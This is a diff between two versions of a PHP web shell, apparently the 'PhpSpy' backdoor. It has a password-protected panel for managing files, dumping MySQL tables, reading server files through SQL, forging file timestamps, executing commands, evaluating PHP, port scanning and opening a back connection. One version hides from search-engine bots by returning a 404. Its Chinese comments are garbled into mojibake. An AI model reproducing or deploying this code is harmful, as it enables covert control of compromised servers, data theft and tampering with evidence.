@@ -1,89 +1,77 @@
 <?php
-//ini_set('display_errors',1);
-@error_reporting(7);
-@session_start();
-@set_time_limit(0);
+error_reporting(7);
 @set_magic_quotes_runtime(0);
-if( strpos( strtolower( $_SERVER['HTTP_USER_AGENT'] ), 'bot' ) !== false ) {
-	header('HTTP/1.0 404 Not Found');
-	exit;
-}
 ob_start();
 $mtime = explode(' ', microtime());
 $starttime = $mtime[1] + $mtime[0];
 define('SA_ROOT', str_replace('\\', '/', dirname(__FILE__)).'/');
-define('SELF', $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME']);
 define('IS_WIN', DIRECTORY_SEPARATOR == '\\');
+define('IS_COM', class_exists('COM') ? 1 : 0 );
 define('IS_GPC', get_magic_quotes_gpc());
 $dis_func = get_cfg_var('disable_functions');
 define('IS_PHPINFO', (!eregi("phpinfo",$dis_func)) ? 1 : 0 );
+@set_time_limit(0);
 
-if( IS_GPC ) {
-	$_POST = s_array($_POST);
+foreach($_POST as $key => $value) {
+	if (IS_GPC) {
+		$value = s_array($value);
+	}
+	$$key = $value;
 }
-$P = $_POST;
-unset($_POST);
-/*===================== 程序配置 =====================*/
+/*===================== 绋嬪簭閰嶇疆 =====================*/
 
 //echo encode_pass('angel');exit;
 //angel = ec38fe2a8497e0a8d6d349b3533038cb
-// 如果需要密码验证,请修改登陆密码,留空为不需要验证
+// 濡傛灉闇€瑕佸瘑鐮侀獙璇�,璇蜂慨鏀圭櫥闄嗗瘑鐮�,鐣欑┖涓轰笉闇€瑕侀獙璇�
 $pass  = 'd96ee15a2c1607c2f4c2183ec922762b'; //angel
 
-//如您对 cookie 作用范围有特殊要求, 或登录不正常, 请修改下面变量, 否则请保持默认
-// cookie 前缀
+//濡傛偍瀵� cookie 浣滅敤鑼冨洿鏈夌壒娈婅姹�, 鎴栫櫥褰曚笉姝ｅ父, 璇蜂慨鏀逛笅闈㈠彉閲�, 鍚﹀垯璇蜂繚鎸侀粯璁�
+// cookie 鍓嶇紑
 $cookiepre = '';
-// cookie 作用域
+// cookie 浣滅敤鍩�
 $cookiedomain = '';
-// cookie 作用路径
+// cookie 浣滅敤璺緞
 $cookiepath = '/';
-// cookie 有效期
+// cookie 鏈夋晥鏈�
 $cookielife = 86400;
 
-/*===================== 配置结束 =====================*/
+//绋嬪簭鎼滅储鍙啓鏂囦欢鐨勭被鍨�
+!$writabledb && $writabledb = 'php,cgi,pl,asp,inc,js,html,htm,jsp';
+/*===================== 閰嶇疆缁撴潫 =====================*/
 
-$charsetdb = array(
-	'big5'			=> 'big5',
-	'cp-866'		=> 'cp866',
-	'euc-jp'		=> 'ujis',
-	'euc-kr'		=> 'euckr',
-	'gbk'			=> 'gbk',
-	'iso-8859-1'	=> 'latin1',
-	'koi8-r'		=> 'koi8r',
-	'koi8-u'		=> 'koi8u',
-	'utf-8'			=> 'utf8',
-	'windows-1252'	=> 'latin1',
-);
-
-$act = isset($P['act']) ? $P['act'] : '';
-$charset = isset($P['charset']) ? $P['charset'] : 'gbk';
-$doing = isset($P['doing']) ? $P['doing'] : '';
-
-for ($i=1;$i<=4;$i++) {
-	${'p'.$i} = isset($P['p'.$i]) ? $P['p'.$i] : '';
+$charsetdb = array('','armscii8','ascii','big5','binary','cp1250','cp1251','cp1256','cp1257','cp850','cp852','cp866','cp932','dec8','euc-jp','euc-kr','gb2312','gbk','geostd8','greek','hebrew','hp8','keybcs2','koi8r','koi8u','latin1','latin2','latin5','latin7','macce','macroman','sjis','swe7','tis620','ucs2','ujis','utf8');
+if ($charset == 'utf8') {
+	header("content-Type: text/html; charset=utf-8");
+} elseif ($charset == 'big5') {
+	header("content-Type: text/html; charset=big5");
+} elseif ($charset == 'gbk') {
+	header("content-Type: text/html; charset=gbk");
+} elseif ($charset == 'latin1') {
+	header("content-Type: text/html; charset=iso-8859-2");
+} elseif ($charset == 'euc-kr') {
+	header("content-Type: text/html; charset=euc-kr");
+} elseif ($charset == 'euc-jp') {
+	header("content-Type: text/html; charset=euc-jp");
 }
 
-if (isset($charsetdb[$charset])) {
-	header("content-Type: text/html; charset=".$charset);
-}
-
+$self = $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];
 $timestamp = time();
 
-/* 身份验证 */
-if ($act == "logout") {
+/*===================== 韬唤楠岃瘉 =====================*/
+if ($action == "logout") {
 	scookie('loginpass', '', -86400 * 365);
-	@header('Location: '.SELF);
+	@header('Location: '.$self);
 	exit;
 }
 if($pass) {
-	if ($act == 'login') {
-		if ($pass == encode_pass($P['password'])) {
-			scookie('loginpass',encode_pass($P['password']));
-			@header('Location: '.SELF);
+	if ($action == 'login') {
+		if ($pass == encode_pass($password)) {
+			scookie('loginpass',encode_pass($password));
+			@header('Location: '.$self);
 			exit;
 		}
 	}
-	if (isset($_COOKIE['loginpass'])) {
+	if ($_COOKIE['loginpass']) {
 		if ($_COOKIE['loginpass'] != $pass) {
 			loginpage();
 		}
@@ -91,90 +79,102 @@ if($pass) {
 		loginpage();
 	}
 }
-/* 验证结束 */
+/*===================== 楠岃瘉缁撴潫 =====================*/
 
 $errmsg = '';
-$uchar = '&#9650;';
-$dchar = '&#9660;';
-!$act && $act = 'file';
+!$action && $action = 'file';
 
-//当前目录/设置工作目录/网站根目录
-$home_cwd = getcwd();
-if (isset($P['cwd']) && $P['cwd']) {
-	chdir($P['cwd']);
-} else {
-	chdir(SA_ROOT);
-}
-$cwd = getcwd();
-$web_cwd = $_SERVER['DOCUMENT_ROOT'];
-foreach (array('web_cwd','cwd','home_cwd') as $k) {
-	if (IS_WIN) {
-		$$k = str_replace('\\', '/', $$k);
-	}
-	if (substr($$k, -1) != '/') {
-		$$k = $$k.'/';
-	}
-}
-
-// 查看PHPINFO
-if ($act == 'phpinfo') {
+// 鏌ョ湅PHPINFO
+if ($action == 'phpinfo') {
 	if (IS_PHPINFO) {
 		phpinfo();
 		exit;
 	} else {
-		$errmsg = 'phpinfo() function has disabled';
+		$errmsg = 'phpinfo() function has non-permissible';
 	}
 }
 
-if(!function_exists('scandir')) {
-	function scandir($cwd) {
-		$files = array();
-		$dh = opendir($cwd);
-		while ($file = readdir($dh)) {
-			$files[] = $file;
-		}
-		return $files ? $files : 0;
-	}
-}
-
-if ($act == 'down') {
-	if (is_file($p1) && is_readable($p1)) {
-		@ob_end_clean();
-		$fileinfo = pathinfo($p1);
-		if (function_exists('mime_content_type')) {
-			$type = @mime_content_type($p1);
-			header("Content-Type: ".$type);
-		} else {
-			header('Content-type: application/x-'.$fileinfo['extension']);
-		}
-		header('Content-Disposition: attachment; filename='.$fileinfo['basename']);
-		header('Content-Length: '.sprintf("%u", @filesize($p1)));
-		@readfile($p1);
-		exit;
+// 涓嬭浇鏂囦欢
+if ($doing == 'downfile' && $thefile) {
+	if (!@file_exists($thefile)) {
+		$errmsg = 'The file you want Downloadable was nonexistent';
 	} else {
-		$errmsg = 'Can\'t read file';
-		$act = 'file';
+		$fileinfo = pathinfo($thefile);
+		header('Content-type: application/x-'.$fileinfo['extension']);
+		header('Content-Disposition: attachment; filename='.$fileinfo['basename']);
+		header('Content-Length: '.filesize($thefile));
+		@readfile($thefile);
+		exit;
 	}
 }
+
+// 鐩存帴涓嬭浇澶囦唤鏁版嵁搴�
+if ($doing == 'backupmysql' && !$saveasfile) {
+	if (!$table) {
+		$errmsg ='Please choose the table';
+	} else {
+		$mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
+		$filename = basename($dbname.'.sql');
+		header('Content-type: application/unknown');
+		header('Content-Disposition: attachment; filename='.$filename);
+		foreach($table as $k => $v) {
+			if ($v) {
+				sqldumptable($v);
+			}
+		}
+		mysql_close();
+		exit;
+	}
+}
+
+// 閫氳繃MYSQL涓嬭浇鏂囦欢
+if($doing=='mysqldown'){
+	if (!$dbname) {
+		$errmsg = 'Please input dbname';
+	} else {
+		$mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
+		if (!file_exists($mysqldlfile)) {
+			$errmsg = 'The file you want Downloadable was nonexistent';
+		} else {
+			$result = q("select load_file('$mysqldlfile');");
+			if(!$result){
+				q("DROP TABLE IF EXISTS tmp_angel;");
+				q("CREATE TABLE tmp_angel (content LONGBLOB NOT NULL);");
+				//鐢ㄦ椂闂存埑鏉ヨ〃绀烘埅鏂�,閬垮厤鍑虹幇璇诲彇鑷韩鎴栧寘鍚玙_angel_1111111111_eof__鐨勬枃浠舵椂涓嶅畬鏁寸殑鎯呭喌
+				q("LOAD DATA LOCAL INFILE '".addslashes($mysqldlfile)."' INTO TABLE tmp_angel FIELDS TERMINATED BY '__angel_{$timestamp}_eof__' ESCAPED BY '' LINES TERMINATED BY '__angel_{$timestamp}_eof__';");
+				$result = q("select content from tmp_angel");
+				q("DROP TABLE tmp_angel");
+			}
+			$row = @mysql_fetch_array($result);
+			if (!$row) {
+				$errmsg = 'Load file failed '.mysql_error();
+			} else {
+				$fileinfo = pathinfo($mysqldlfile);
+				header('Content-type: application/x-'.$fileinfo['extension']);
+				header('Content-Disposition: attachment; filename='.$fileinfo['basename']);
+				header("Accept-Length: ".strlen($row[0]));
+				echo $row[0];
+				exit;
+			}
+		}
+	}
+}
+
 ?>
 <html>
 <head>
-<meta http-equiv="Content-Type" content="text/html; charset=<?php echo $charset;?>">
-<title><?php echo $act.' - '.$_SERVER['HTTP_HOST'];?></title>
+<meta http-equiv="Content-Type" content="text/html; charset=gbk">
+<title><?php echo $action.' - '.$_SERVER['HTTP_HOST'];?></title>
 <style type="text/css">
 body,td{font: 12px Arial,Tahoma;line-height: 16px;}
-.input, select{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:22px;}
+.input{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:22px;}
 .area{font:12px 'Courier New', Monospace;background:#fff;border: 1px solid #666;padding:2px;}
-.red{color:#f00;}
-.black{color:#000;}
-.green{color:#090;}
-.b{font-weight:bold;}
-.bt {border-color:#b0b0b0;background:#3d3d3d;color:#fff;font:12px Arial,Tahoma;height:22px;}
-a {color: #00f;text-decoration:none;}
-a:hover{color: #f00;text-decoration:underline;}
+.bt {border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px;}
+a {color: #00f;text-decoration:underline;}
+a:hover{color: #f00;text-decoration:none;}
 .alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f1f1f1;padding:5px 15px 5px 5px;}
 .alt2 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f9f9f9;padding:5px 15px 5px 5px;}
-.focus td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffa;padding:5px 15px 5px 5px;}
+.focus td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 15px 5px 5px;}
 .head td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e9e9e9;padding:5px 15px 5px 5px;font-weight:bold;}
 .head td span{font-weight:normal;}
 .infolist {padding:10px;margin:10px 0 20px 0;background:#F1F1F1;border:1px solid #ddd;}
@@ -186,13 +186,11 @@ u{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-r
 .drives span {margin:auto 7px;}
 </style>
 <script type="text/javascript">
-function checkall(form) {
+function CheckAll(form) {
 	for(var i=0;i<form.elements.length;i++) {
 		var e = form.elements[i];
-        if (e.type == 'checkbox') {
-			if (e.name != 'chkall' && e.name != 'saveasfile')
-				e.checked = form.chkall.checked;
-		}
+		if (e.name != 'chkall')
+		e.checked = form.chkall.checked;
     }
 }
 function $(id) {
@@ -202,77 +200,118 @@ function createdir(){
 	var newdirname;
 	newdirname = prompt('Please input the directory name:', '');
 	if (!newdirname) return;
-	g(null,null,'createdir',newdirname);
+	$('createdir').newdirname.value=newdirname;
+	$('createdir').submit();
 }
-function fileperm(pfile, val){
+function fileperm(pfile){
 	var newperm;
-	newperm = prompt('Current dir/file:'+pfile+'\nPlease input new permissions:', val);
+	newperm = prompt('Current file:'+pfile+'\nPlease input new attribute:', '');
 	if (!newperm) return;
-	g(null,null,'fileperm',pfile,newperm);
+	$('fileperm').newperm.value=newperm;
+	$('fileperm').pfile.value=pfile;
+	$('fileperm').submit();
+}
+function copyfile(sname){
+	var tofile;
+	tofile = prompt('Original file:'+sname+'\nPlease input object file (fullpath):', '');
+	if (!tofile) return;
+	$('copyfile').tofile.value=tofile;
+	$('copyfile').sname.value=sname;
+	$('copyfile').submit();
 }
 function rename(oldname){
 	var newfilename;
-	newfilename = prompt('Filename:'+oldname+'\nPlease input new filename:', '');
+	newfilename = prompt('Former file name:'+oldname+'\nPlease input new filename:', '');
 	if (!newfilename) return;
-	g(null,null,'rename',newfilename,oldname);
+	$('rename').newfilename.value=newfilename;
+	$('rename').oldname.value=oldname;
+	$('rename').submit();
 }
-function createfile(){
+function dofile(doing,thefile,m){
+	if (m && !confirm(m)) {
+		return;
+	}
+	$('filelist').doing.value=doing;
+	if (thefile){
+		$('filelist').thefile.value=thefile;
+	}
+	$('filelist').submit();
+}
+function createfile(nowpath){
 	var filename;
 	filename = prompt('Please input the file name:', '');
 	if (!filename) return;
-	g('editfile', null, null, filename);
+	opfile('editfile',nowpath + filename,nowpath);
 }
-function setdb(dbname) {
-	if(!dbname) return;
-	$('dbform').tablename.value='';
-	$('dbform').doing.value='';
-	if ($('dbform').sql_query)
-	{
-		$('dbform').sql_query.value='';
+function opfile(action,opfile,dir){
+	$('fileopform').action.value=action;
+	$('fileopform').opfile.value=opfile;
+	$('fileopform').dir.value=dir;
+	$('fileopform').submit();
+}
+function godir(dir,view_writable){
+	if (view_writable) {
+		$('godir').view_writable.value=view_writable;
 	}
-	$('dbform').submit();
+	$('godir').dir.value=dir;
+	$('godir').submit();
 }
-function setsort(k) {
-	$('dbform').order.value=k;
-	$('dbform').submit();
+function getsize(getdir,dir){
+	$('getsize').getdir.value=getdir;
+	$('getsize').dir.value=dir;
+	$('getsize').submit();
 }
-function settable(tablename,doing) {
+function editrecord(action, base64, tablename){
+	if (action == 'del') {
+		if (!confirm('Is or isn\'t deletion record?')) return;
+	}
+	$('recordlist').doing.value=action;
+	$('recordlist').base64.value=base64;
+	$('recordlist').tablename.value=tablename;
+	$('recordlist').submit();
+}
+function moddbname(dbname) {
+	if(!dbname) return;
+	$('setdbname').dbname.value=dbname;
+	$('setdbname').submit();
+}
+function settable(tablename,doing,page) {
 	if(!tablename) return;
 	if (doing) {
-		$('dbform').doing.value=doing;
-	} else {
-		$('dbform').doing.value='';
+		$('settable').doing.value=doing;
 	}
-	$('dbform').sql_query.value='';
-	$('dbform').tablename.value=tablename;
-	$('dbform').submit();
+	if (page) {
+		$('settable').page.value=page;
+	}
+	$('settable').tablename.value=tablename;
+	$('settable').submit();
 }
-function s(act,cwd,p1,p2,p3,p4,charset) {
-	if(act != null) $('opform').act.value=act;
-	if(cwd != null) $('opform').cwd.value=cwd;
-	if(p1 != null) $('opform').p1.value=p1;
-	if(p2 != null) $('opform').p2.value=p2;
-	if(p3 != null) $('opform').p3.value=p3;
-	if(p4 != null) {$('opform').p4.value=p4;}else{$('opform').p4.value='';}
-	if(charset != null) $('opform').charset.value=charset;
+function s(action,nowpath,p1,p2,p3,p4,p5) {
+	if(action) $('opform').action.value=action;
+	if(nowpath) $('opform').nowpath.value=nowpath;
+	if(p1) $('opform').p1.value=p1;
+	if(p2) $('opform').p2.value=p2;
+	if(p3) $('opform').p3.value=p3;
+	if(p4) $('opform').p4.value=p4;
+	if(p5) $('opform').p4.value=p5;
 }
-function g(act,cwd,p1,p2,p3,p4,charset) {
-	s(act,cwd,p1,p2,p3,p4,charset);
+function g(action,nowpath,p1,p2,p3,p4,p5) {
+	if(!action) return;
+	s(action,nowpath,p1,p2,p3,p4,p5);
 	$('opform').submit();
 }
 </script>
 </head>
 <body style="margin:0;table-layout:fixed; word-break:break-all">
 <?php
-
 formhead(array('name'=>'opform'));
-makehide('act', $act);
-makehide('cwd', $cwd);
+makehide('action', $action);
+makehide('nowpath', $nowpath);
 makehide('p1', $p1);
 makehide('p2', $p2);
 makehide('p3', $p3);
 makehide('p4', $p4);
-makehide('charset', $charset);
+makehide('p5', $p5);
 formfoot();
 
 if(!function_exists('posix_getegid')) {
@@ -283,11 +322,12 @@ if(!function_exists('posix_getegid')) {
 } else {
 	$uid = @posix_getpwuid(@posix_geteuid());
 	$gid = @posix_getgrgid(@posix_getegid());
-	$uid = $uid['uid'];
 	$user = $uid['name'];
-	$gid = $gid['gid'];
+	$uid = $uid['uid'];
 	$group = $gid['name'];
+	$gid = $gid['gid'];
 }
+
 ?>
 <table width="100%" border="0" cellpadding="0" cellspacing="0">
 	<tr class="head">
@@ -295,20 +335,17 @@ if(!function_exists('posix_getegid')) {
 	</tr>
 	<tr class="alt1">
 		<td>
-			<span style="float:right;">Charset:
-			<?php
-			makeselect(array('name'=>'charset','option'=>$charsetdb,'selected'=>$charset,'onchange'=>'g(null,null,null,null,null,null,this.value);'));
-			?>
-			</span>
+			<span style="float:right;">PHP <?php echo PHP_VERSION;?> / Safe Mode:<?php echo getcfg('safe_mode');?></span>
 			<a href="javascript:g('logout');">Logout</a> |
-			<a href="javascript:g('file',null,'','','','','<?php echo $charset;?>');">File Manager</a> |
-			<a href="javascript:g('mysqladmin',null,'','','','','<?php echo $charset;?>');">MYSQL Manager</a> |
-			<a href="javascript:g('shell',null,'','','','','<?php echo $charset;?>');">Execute Command</a> |
-			<a href="javascript:g('phpenv',null,'','','','','<?php echo $charset;?>');">PHP Variable</a> |
-			<a href="javascript:g('portscan',null,'','','','','<?php echo $charset;?>');">Port Scan</a> |
-			<a href="javascript:g('secinfo',null,'','','','','<?php echo $charset;?>');">Security information</a> |
-			<a href="javascript:g('eval',null,'','','','','<?php echo $charset;?>');">Eval PHP Code</a>
-			<?php if (!IS_WIN) {?> | <a href="javascript:g('backconnect',null,'','','','','<?php echo $charset;?>');">Back Connect</a><?php }?>
+			<a href="javascript:g('file');">File Manager</a> |
+			<a href="javascript:g('mysqladmin');">MYSQL Manager</a> |
+			<a href="javascript:g('sqlfile');">MySQL Upload &amp; Download</a> |
+			<a href="javascript:g('shell');">Execute Command</a> |
+			<a href="javascript:g('phpenv');">PHP Variable</a> |
+			<a href="javascript:g('portscan');">Port Scan</a> |
+			<a href="javascript:g('secinfo');">Security information</a> |
+			<a href="javascript:g('eval');">Eval PHP Code</a>
+			<?php if (!IS_WIN) {?> | <a href="javascript:g('backconnect');">Back Connect</a><?php }?>
 		</td>
 	</tr>
 </table>
@@ -316,113 +353,160 @@ if(!function_exists('posix_getegid')) {
 <?php
 $errmsg && m($errmsg);
 
-if ($act == 'file') {
+// 鑾峰彇褰撳墠璺緞
+if (!$dir) {
+	$dir = $_SERVER["DOCUMENT_ROOT"] ? $_SERVER["DOCUMENT_ROOT"] : '.';
+}
+$nowpath = getPath(SA_ROOT, $dir);
+if (substr($dir, -1) != '/') {
+	$dir = $dir.'/';
+}
 
-	// 判断当前目录可写情况
-	$dir_writeable = @is_writable($cwd) ? 'Writable' : 'Non-writable';
-	if (isset($p1)) {
-		switch($p1) {
-			case 'createdir':
-				// 创建目录
-				if ($p2) {
-					m('Directory created '.(@mkdir($cwd.$p2,0777) ? 'success' : 'failed'));
-				}
-				break;
-			case 'uploadFile':
-				// 上传文件
-				m('File upload '.(@move_uploaded_file($_FILES['uploadfile']['tmp_name'], $cwd.'/'.$_FILES['uploadfile']['name']) ? 'success' : 'failed'));
-				break;
-			case 'fileperm':
-				// 编辑文件属性
-				if ($p2 && $p3) {
-					$p3 = base_convert($p3, 8, 10);
-					m('Set file permissions '.(@chmod($p2, $p3) ? 'success' : 'failed'));
-				}
-				break;
-			case 'rename':
-				// 改名
-				if ($p2 && $p3) {
-					m($p3.' renamed '.$p2.(@rename($p3, $p2) ? ' success' : ' failed'));
-				}
-				break;
-			case 'clonetime':
-				// 克隆时间
-				if ($p2 && $p3) {
-					$time = @filemtime($p3);
-					m('Set file last modified '.(@touch($p2,$time,$time) ? 'success' : 'failed'));
-				}
-				break;
-			case 'settime':
-				// 自定义时间
-				if ($p2 && $p3) {
-					$time = strtotime($p3);
-					m('Set file last modified '.(@touch($p2,$time,$time) ? 'success' : 'failed'));
-				}
-				break;
-			case 'delete':
-				// 批量删除文件
-				if ($P['dl']) {
-					$succ = $fail = 0;
-					foreach ($P['dl'] as $f) {
-						if (is_dir($cwd.$f)) {
-							if (@deltree($cwd.$f)) {
-								$succ++;
-							} else {
-								$fail++;
-							}
-						} else {
-							if (@unlink($cwd.$f)) {
-								$succ++;
-							} else {
-								$fail++;
-							}
-						}
-					}
-					m('Deleted folder/file(s) have finished, choose '.count($P['dl']).', success '.$succ.', fail '.$fail);
-				} else {
-					m('Please select folder/file(s)');
-				}
-				break;
-			case 'paste':
-				if($_SESSION['do'] == 'copy') {
-					foreach($_SESSION['dl'] as $f) {
-						copy_paste($_SESSION['c'],$f, $cwd);
-					}
-				} elseif($_SESSION['do'] == 'move') {
-					foreach($_SESSION['dl'] as $f) {
-						@rename($_SESSION['c'].$f, $cwd.$f);
-					}
-				}
-				unset($_SESSION['do'], $_SESSION['dl'], $_SESSION['c']);
-				break;
-			default:
-				if($p1 == 'copy' || $p1 == 'move') {
-					if (isset($P['dl']) && count($P['dl'])) {
-						$_SESSION['do'] = $p1;
-						$_SESSION['dl'] = $P['dl'];
-						$_SESSION['c'] = $P['cwd'];
-						m('Have been copied to the session');
-					} else {
-						m('Please select folder/file(s)');
-					}
-				}
-				break;
+if ($action == 'file') {
+
+	// 鍒ゆ柇璇诲啓鎯呭喌
+	$dir_writeable = @is_writable($nowpath) ? 'Writable' : 'Non-writable';
+
+	// 鍒涘缓鐩綍
+	if ($newdirname) {
+		$mkdirs = $nowpath.$newdirname;
+		if (file_exists($mkdirs)) {
+			m('Directory has already existed');
+		} else {
+			m('Directory created '.(@mkdir($mkdirs,0777) ? 'success' : 'failed'));
+			@chmod($mkdirs,0777);
 		}
-		echo "<script type=\"text/javascript\">$('opform').p1.value='';$('opform').p2.value='';</script>";
 	}
-	//操作完毕
-	$free = @disk_free_space($cwd);
+
+	// 涓婁紶鏂囦欢
+	elseif ($doupfile) {
+		m('File upload '.(@copy($_FILES['uploadfile']['tmp_name'],$uploaddir.'/'.$_FILES['uploadfile']['name']) ? 'success' : 'failed'));
+	}
+
+	// 缂栬緫鏂囦欢
+	elseif ($editfilename && $filecontent) {
+		$fp = @fopen($editfilename,'w');
+		m('Save file '.(@fwrite($fp,$filecontent) ? 'success' : 'failed'));
+		@fclose($fp);
+	}
+
+	// 缂栬緫鏂囦欢灞炴€�
+	elseif ($pfile && $newperm) {
+		if (!file_exists($pfile)) {
+			m('The original file does not exist');
+		} else {
+			$newperm = base_convert($newperm,8,10);
+			m('Modify file attributes '.(@chmod($pfile,$newperm) ? 'success' : 'failed'));
+		}
+	}
+
+	// 鏀瑰悕
+	elseif ($oldname && $newfilename) {
+		$nname = $nowpath.$newfilename;
+		if (file_exists($nname) || !file_exists($oldname)) {
+			m($nname.' has already existed or original file does not exist');
+		} else {
+			m(basename($oldname).' renamed '.basename($nname).(@rename($oldname,$nname) ? ' success' : 'failed'));
+		}
+	}
+
+	// 澶嶅埗鏂囦欢
+	elseif ($sname && $tofile) {
+		if (file_exists($tofile) || !file_exists($sname)) {
+			m('The goal file has already existed or original file does not exist');
+		} else {
+			m(basename($tofile).' copied '.(@copy($sname,$tofile) ? basename($tofile).' success' : 'failed'));
+		}
+	}
+
+	// 鍏嬮殕鏃堕棿
+	elseif ($curfile && $tarfile) {
+		if (!@file_exists($curfile) || !@file_exists($tarfile)) {
+			m('The goal file has already existed or original file does not exist');
+		} else {
+			$time = @filemtime($tarfile);
+			m('Modify file the last modified '.(@touch($curfile,$time,$time) ? 'success' : 'failed'));
+		}
+	}
+
+	// 鑷畾涔夋椂闂�
+	elseif ($curfile && $year && $month && $day && $hour && $minute && $second) {
+		if (!@file_exists($curfile)) {
+			m(basename($curfile).' does not exist');
+		} else {
+			$time = strtotime("$year-$month-$day $hour:$minute:$second");
+			m('Modify file the last modified '.(@touch($curfile,$time,$time) ? 'success' : 'failed'));
+		}
+	}
+
+	// 鎵归噺鍒犻櫎鏂囦欢
+	elseif($doing == 'delfiles') {
+		if ($dl) {
+			$dfiles='';
+			$succ = $fail = 0;
+			foreach ($dl as $filepath) {
+				if (is_dir($filepath)) {
+					if (@deltree($filepath)) {
+						$succ++;
+					} else {
+						$fail++;
+					}
+				} else {
+					if (@unlink($filepath)) {
+						$succ++;
+					} else {
+						$fail++;
+					}
+				}
+			}
+			m('Deleted folder/file have finished,choose '.count($dl).' success '.$succ.' fail '.$fail);
+		} else {
+			m('Please select folder/file(s)');
+		}
+	}
+
+	//鎿嶄綔瀹屾瘯
+	formhead(array('name'=>'createdir'));
+	makehide('newdirname');
+	makehide('dir',$nowpath);
+	formfoot();
+	formhead(array('name'=>'fileperm'));
+	makehide('newperm');
+	makehide('pfile');
+	makehide('dir',$nowpath);
+	formfoot();
+	formhead(array('name'=>'copyfile'));
+	makehide('sname');
+	makehide('tofile');
+	makehide('dir',$nowpath);
+	formfoot();
+	formhead(array('name'=>'rename'));
+	makehide('oldname');
+	makehide('newfilename');
+	makehide('dir',$nowpath);
+	formfoot();
+	formhead(array('name'=>'fileopform', 'target'=>'_blank'));
+	makehide('action');
+	makehide('opfile');
+	makehide('dir');
+	formfoot();
+	formhead(array('name'=>'getsize'));
+	makehide('getdir');
+	makehide('dir');
+	formfoot();
+
+	$free = @disk_free_space($nowpath);
 	!$free && $free = 0;
-	$all = @disk_total_space($cwd);
+	$all = @disk_total_space($nowpath);
 	!$all && $all = 0;
 	$used = $all-$free;
 	p('<h2>File Manager - Current disk free '.sizecount($free).' of '.sizecount($all).' ('.@round(100/($all/$free),2).'%)</h2>');
 
 	$cwd_links = '';
-	$path = explode('/', $cwd);
+	$path = explode('/', $nowpath);
 	$n=count($path);
 	for($i=0;$i<$n-1;$i++) {
-		$cwd_links .= '<a href="javascript:g(\'file\', \'';
+		$cwd_links .= '<a href="javascript:godir(\'';
 		for($j=0;$j<=$i;$j++) {
 			$cwd_links .= $path[$j].'/';
 		}
@@ -438,6 +522,7 @@ function shownav(e){
 		if(src.id =="jumpto") {
 			$('inputnav').style.display = "";
 			$('pathnav').style.display = "none";
+			//hidenav();
 			return;
 		}
 		if(src.id =="inputnav") {
@@ -451,391 +536,723 @@ function shownav(e){
 }
 </script>
 <div style="background:#eee;margin-bottom:10px;">
-	<form onsubmit="g('file',this.cwd.value);return false;" method="POST" id="godir" name="godir">
-		<table id="pathnav" width="100%" border="0" cellpadding="5" cellspacing="0">
-			<tr>
-				<td width="100%"><?php echo $cwd_links.' - '.getChmod($cwd).' / '.PermsColor($cwd).getUser($cwd);?> (<?php echo $dir_writeable;?>)</td>
-				<td nowrap><input class="bt" id="jumpto" name="jumpto" value="Jump to" type="button"></td>
-			</tr>
-		</table>
-		<table id="inputnav" width="100%" border="0" cellpadding="5" cellspacing="0" style="display:none;">
-			<tr>
-				<td nowrap>Current Directory (<?php echo $dir_writeable;?>, <?php echo getChmod($cwd);?>)</td>
-				<td width="100%"><input class="input" name="cwd" value="<?php echo $cwd;?>" type="text" style="width:99%;margin:0 8px;"></td>
-				<td nowrap><input class="bt" value="GO" type="submit"></td>
-			</tr>
-		</table>
+	<table id="pathnav" width="100%" border="0" cellpadding="5" cellspacing="0">
+		<tr>
+			<td width="100%"><?php echo $cwd_links.' - '.getChmod($nowpath).' / '.getPerms($nowpath).getUser($nowpath);?> (<?php echo $dir_writeable;?>)</td>
+			<td nowrap><input class="bt" id="jumpto" name="jumpto" value="Jump to" type="button"></td>
+		</tr>
+	</table>
+	<table id="inputnav" width="100%" border="0" cellpadding="5" cellspacing="0" style="display:none;">
+	<form action="" method="post" id="godir" name="godir">
+		<tr>
+			<td nowrap>Current Directory (<?php echo $dir_writeable;?>, <?php echo getChmod($nowpath);?>)</td>
+			<td width="100%"><input name="view_writable" value="0" type="hidden" /><input class="input" name="dir" value="<?php echo $nowpath;?>" type="text" style="width:99%;margin:0 8px;"></td>
+			<td nowrap><input class="bt" value="GO" type="submit"></td>
+		</tr>
 	</form>
+	</table>
 <?php
-	if (IS_WIN) {
-		$comma = '';
-		p('<div class="drives">');
-		foreach( range('A','Z') as $drive ) {
-			if (is_dir($drive.':/')) {
-				p($comma.'<a href="javascript:g(\'file\', \''.$drive.':/\');">'.$drive.':\</a>');
-				$comma = '<span>|</span>';
+	if (IS_WIN && IS_COM) {
+		$obj = new COM('scripting.filesystemobject');
+		if ($obj && is_object($obj) && $obj->Drives) {
+			echo '<div class="drives">';
+			$DriveTypeDB = array(0 => 'Unknow',1 => 'Removable',2 => 'Fixed',3 => 'Network',4 => 'CDRom',5 => 'RAM Disk');
+			$comma = '';
+			foreach($obj->Drives as $drive) {
+				if ($drive->Path) {
+					p($comma.'<a href="javascript:godir(\''.$drive->Path.'/\');">'.$DriveTypeDB[$drive->DriveType].'('.$drive->Path.')</a>');
+					$comma = '<span>|</span>';
+				}
 			}
+			echo '</div>';
 		}
-		p('</div>');
 	}
 ?>
 </div>
 <?php
-	p('<table width="100%" border="0" cellpadding="4" cellspacing="0">');
-	p('<tr class="alt1"><td colspan="6" style="padding:5px;line-height:20px;">');
-	p('<form action="'.SELF.'" method="POST" enctype="multipart/form-data"><div style="float:right;"><input name="uploadfile" value="" type="file" /> <input class="bt" value="Upload" type="submit" /><input name="charset" value="'.$charset.'" type="hidden" /><input type="hidden" name="p1" value="uploadFile"><input name="cwd" value="'.$cwd.'" type="hidden" /></div></form>');
